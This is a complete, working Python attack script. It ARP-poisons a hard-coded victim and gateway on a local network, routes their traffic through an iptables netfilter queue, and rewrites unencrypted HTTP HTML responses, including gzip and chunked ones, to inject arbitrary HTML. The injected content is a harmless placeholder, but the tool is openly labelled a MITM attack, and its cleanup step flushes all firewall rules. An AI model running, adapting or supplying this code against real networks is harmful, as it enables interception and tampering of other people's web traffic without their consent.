from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time

# Set these values based on your network
victim_ip = "192.168.0.105"
gateway_ip = "192.168.0.1"
interface = "wlo1"
victim_mac = "9a:be:d0:91:f3:76"
gateway_mac = "40:ed:00:4a:67:44"

injection_code = b"<h1>Hello world</h1><img src='https://i.imgflip.com/2dq3nf.jpg?a486216'/>"

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, victim_mac, spoof_ip):
    pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(pkt, iface=interface, verbose=0)

def restore(target_ip, target_mac, source_ip, source_mac):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=source_ip, hwsrc=source_mac)
    sendp(pkt, count=5, iface=interface, verbose=0)

import re
import zlib
import io
import gzip

def inject_at_top(html_bytes, injection_code):
    """
    Insert injection_code bytes immediately after the opening <body> tag if found,
    otherwise at the very beginning of html_bytes.
    """
    pattern = re.compile(b"(<body[^>]*>)", re.IGNORECASE)
    match = pattern.search(html_bytes)
    if match:
        insert_pos = match.end()
        return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
    else:
        # No <body> tag found, insert at start
        return injection_code + html_bytes

def decode_chunked(data):
    decoded = b""
    while data:
        pos = data.find(b"\r\n")
        if pos == -1:
            break
        chunk_size = int(data[:pos], 16)
        if chunk_size == 0:
            break
        data = data[pos+2:]
        decoded += data[:chunk_size]
        data = data[chunk_size+2:]  # skip \r\n after chunk
    return decoded

def encode_chunked(data):
    chunks = []
    chunk_size = 1024
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append(b"%X\r\n" % len(chunk) + chunk + b"\r\n")
    chunks.append(b"0\r\n\r\n")
    return b"".join(chunks)

def modify_packet(packet):
    scapy_pkt = IP(packet.get_payload())

    if not (scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP)):
        packet.accept()
        return

    payload = scapy_pkt[Raw].load

    if b"HTTP/" not in payload or b"Content-Type: text/html" not in payload:
        packet.accept()
        return

    try:
        header_raw, body = payload.split(b"\r\n\r\n", 1)
    except ValueError:
        packet.accept()
        return

    headers_text = header_raw.decode(errors='ignore')
    header_dict = {}
    for line in headers_text.split("\r\n")[1:]:
        parts = line.split(":", 1)
        if len(parts) == 2:
            header_dict[parts[0].strip().lower()] = parts[1].strip().lower()

    is_gzip = header_dict.get("content-encoding") == "gzip"
    is_chunked = header_dict.get("transfer-encoding") == "chunked"

    if is_gzip:
        print("[*] Gzip encoding detected. Decompressing...")

        try:
            raw_body = body
            if is_chunked:
                raw_body = decode_chunked(body)

            # Decompress gzip body
            decompressed = gzip.decompress(raw_body)

            # Inject at top
            injected_body = inject_at_top(decompressed, injection_code)

            # Recompress gzip body
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode='wb') as f:
                f.write(injected_body)
            recompressed = buf.getvalue()

            if is_chunked:
                recompressed = encode_chunked(recompressed)

            # Update Content-Length header if exists and not chunked
            if not is_chunked and "content-length" in header_dict:
                new_length = str(len(recompressed))
                headers_text = re.sub(
                    r"(?i)^(Content-Length:\s*)\d+", 
                    f"Content-Length: {new_length}", 
                    headers_text, flags=re.MULTILINE
                )

            # Rebuild full payload
            new_payload = headers_text.encode() + b"\r\n\r\n" + recompressed

            scapy_pkt[Raw].load = new_payload

            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            packet.set_payload(bytes(scapy_pkt))
            print("[+] Injection and recompression successful")

        except Exception as e:
            print(f"[!] Gzip injection failed: {e}")

    else:
        print("[*] Non-gzip response, injecting at top")
        try:
            modified_body = inject_at_top(body, injection_code)
            new_content_length = str(len(modified_body))

            if re.search(r"(?i)^Content-Length:\s*\d+", headers_text, re.MULTILINE):
                headers_text = re.sub(r"(?i)^(Content-Length:\s*)\d+", 
                                      f"Content-Length: {new_content_length}", headers_text, flags=re.MULTILINE)
            else:
                headers_text += f"\r\nContent-Length: {new_content_length}"

            new_payload = headers_text.encode() + b"\r\n\r\n" + modified_body

            scapy_pkt[Raw].load = new_payload

            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            packet.set_payload(bytes(scapy_pkt))

            print(f"[+] Injection successful, Content-Length updated to {new_content_length}")
        except Exception as e:
            print(f"[!] Injection failed: {e}")

    packet.accept()



def start_packet_injection():
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_packet)
    print("[*] HTTP injector running... Press Ctrl+C to stop.")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping injector...")
    finally:
        nfqueue.unbind()
        os.system("iptables -F")

def main():
    print("[*] Starting ARP poisoning & MITM attack")
    enable_ip_forwarding()

    def exit_gracefully(signum, frame):
        print("\n[!] Cleaning up...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        disable_ip_forwarding()
        os.system("iptables -F")
        print("[+] Cleanup complete.")
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start ARP poisoning in background
    def poison_loop():
        while True:
            poison(victim_ip, victim_mac, gateway_ip)
            poison(gateway_ip, gateway_mac, victim_ip)
            time.sleep(2)

    from threading import Thread
    Thread(target=poison_loop, daemon=True).start()

    # Start HTTP injection
    start_packet_injection()

if __name__ == "__main__":
    main()
